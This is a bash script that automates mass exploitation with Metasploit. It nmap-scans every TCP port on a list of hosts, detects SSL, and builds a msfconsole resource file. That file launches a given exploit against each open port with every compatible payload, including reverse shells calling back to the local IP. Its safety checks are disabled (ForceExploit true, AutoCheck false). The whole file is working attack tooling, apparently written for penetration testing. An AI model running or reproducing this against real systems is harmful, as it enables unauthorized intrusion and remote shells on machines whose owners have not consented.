#!/bin/bash 
# 20220510 kirby


if [[ ! -f "$1" ]]
then
    echo "must supply file of hosts"
    exit
fi

if [[ "x$2" == 'x' ]]
then
    echo "must supply exploit"
    exit
fi

srvport=10000
if [[ $srvport == 19999 ]]
then
    srvport=10000
fi
while netstat -ant|grep LISTEN |grep ":$srvport " >/dev/null 2>&1
do
    let srvport++
done



#ngrepfile=$(eval mktemp).nmap
cmdfile="${1}.msfcmd"
report="${1}.report"
exploit=$2
lport=20000
myip=$(ip addr show dev $(ip route |awk '/default/ {print $5}')|awk '/inet / {print $2}' |cut -d'/' -f1)
echo 'color false' > "$cmdfile"
BORDER='##################################################' 


function echoauxil()
{
    let lport++
    if [[ $lport == 65535 ]]
    then
        lport=20000
    fi
    while netstat -ant|grep LISTEN |grep ":$lport " >/dev/null 2>&1
    do
        let lport++
    done


    echo "echo \"$BORDER\"" >> "$cmdfile"
    echo "echo 'TESTING $host:$port'" >> "$cmdfile"
    echo "use $exploit" >> "$cmdfile"
    echo "set RPORT $port" >> "$cmdfile"
    echo "set RHOSTS $host" >> "$cmdfile"
    echo "set RHOST $host" >> "$cmdfile"
    echo "set VERBOSE false" >> "$cmdfile"
    echo "set LPORT $lport" >> "$cmdfile"
    echo "set LHOST $myip" >> "$cmdfile"
    echo "set SRVPORT $srvport" >> "$cmdfile"
    echo "set SRVHOST $myip" >> "$cmdfile"
    echo "set SENDER_HOST_ADDRESS $myip" >> "$cmdfile"
    echo "set SSL $SSL" >> "$cmdfile"
    echo "set ForceExploit True" >> "$cmdfile"
    echo "set AutoCheck false" >> "$cmdfile"
    echo "set HttpTrace true" >> "$cmdfile"
    echo "exploit -j" >> "$cmdfile"
    echo "sleep .1" >> "$cmdfile"

    echo "jobs" >> "$cmdfile"
    echo "sessions" >> "$cmdfile"
    echo "sleep .1" >> "$cmdfile"
}


function echoexploit()
{

    for payload in ${PAYLOADS[@]}
    do
        let lport++
        if [[ $lport == 65535 ]]
        then
            lport=20000
        fi
        while netstat -ant|grep LISTEN |grep ":$lport " >/dev/null 2>&1
        do
            let lport++
        done


        echo "echo \"$BORDER\"" >> "$cmdfile"
        echo "echo 'TESTING $host:$port'" >> "$cmdfile"
        echo "use $exploit" >> "$cmdfile"
        echo "set PAYLOAD $payload" >> "$cmdfile"
        echo "set RPORT $port" >> "$cmdfile"
        echo "set RHOSTS $host" >> "$cmdfile"
        echo "set RHOST $host" >> "$cmdfile"
        echo "set VERBOSE false" >> "$cmdfile"
        echo "set LPORT $lport" >> "$cmdfile"
        echo "set LHOST $myip" >> "$cmdfile"
        echo "set SRVPORT $srvport" >> "$cmdfile"
        echo "set SRVHOST $myip" >> "$cmdfile"
        echo "set SENDER_HOST_ADDRESS $myip" >> "$cmdfile"
        echo "set SSL $SSL" >> "$cmdfile"
        echo "set ForceExploit True" >> "$cmdfile"
        echo "set AutoCheck false" >> "$cmdfile"
        echo "set HttpTrace true" >> "$cmdfile"
        echo "exploit -j" >> "$cmdfile"
        echo "sleep .1" >> "$cmdfile"
    done

    echo "jobs" >> "$cmdfile"
    echo "sessions" >> "$cmdfile"
    echo "sleep .1" >> "$cmdfile"
}

for payload in $(/usr/share/metasploit-framework/msfconsole -q -n -x \
    "use $exploit; show payloads; exit -y" \
    |sed -r 's/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g' \
    |awk '/payload\// {print $2}')
do
    PAYLOADS[${#PAYLOADS[@]}]=$payload
done



shopt -s nocasematch
ngrepfile="${1}.ngrep"
nmapfile="${1}.nmap"
xmlfile="${1}.xml"
if [[ ! -f "$ngrepfile" ]]
then
    nmap -sV -T5 -n --open -p T:1-65535 -sT -iL $1 -oG "$ngrepfile" -oN "$nmapfile" -oX "$xmlfile" >/dev/null 2>&1
fi

for host in $(cat "$1" |sort -u |egrep -v '^$|#')
do
    IFS=$'\n'
    for line in $(grep " $host " $ngrepfile |egrep '\sPorts:\s' |sed -e 's/.*Ports: //')
    do   
        IFS=','
        for fields in $line
        do   
            portinfo=()
            IFS='/'
            for d in $fields
            do   
                portinfo[${#portinfo[@]}]="$d"
            done 
            IFS=$'\n'
            port="${portinfo[0]// /}"
            state=${portinfo[1]}
            protocol=${portinfo[2]}
            owner=${portinfo[3]}
            service=${portinfo[4]}
            rpc_info=${portinfo[5]}
            version=${portinfo[6]}

            if [[ $state =~ filtered ]]
            then 
                continue
            fi   

            if echo ''|timeout -k 5 5 openssl s_client -connect ${host}:${port} >/dev/null 2>&1
            then
                SSL='true'
            else
                SSL='false'
            fi

            if [[ $exploit =~ ^auxiliary/ ]]
            then
                echoauxil
            else
                echoexploit
            fi
        done
    done
done
#echo "exit" >> "$cmdfile"
for i in {1..60}
do
    echo "jobs" >> "$cmdfile"
    echo "sessions" >> "$cmdfile"
    echo "sleep 5" >> "$cmdfile"
done
echo "Running msf scan"
echo "Outputing to $report"
echo "View screen to monitor progress"
screen -O -dmS mkmsfexploit -L -Logfile "$report" /usr/share/metasploit-framework/msfconsole -q -n -r "$cmdfile"
screen -list 
